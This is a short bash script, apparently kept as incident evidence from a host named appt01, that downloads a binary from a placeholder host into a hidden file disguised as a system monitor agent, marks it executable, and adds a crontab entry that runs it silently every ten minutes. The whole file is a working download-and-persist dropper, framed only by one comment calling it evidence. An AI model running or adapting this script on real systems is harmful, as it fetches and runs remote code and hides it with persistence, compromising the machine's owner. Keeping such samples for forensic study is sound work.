#!/bin/bash
# Recovered from /tmp/.m.sh on appt01. Kept as evidence only; the address is a lab example and doesn't exist.
cd /tmp
curl -s -A "curl/7.81.0" http://cdn.patch-relay.example/a.bin -o /usr/local/bin/.sysmon-agent
chmod 755 /usr/local/bin/.sysmon-agent
( crontab -l 2>/dev/null; echo "*/10 * * * * /usr/local/bin/.sysmon-agent --quiet >/dev/null 2>&1" ) | crontab -
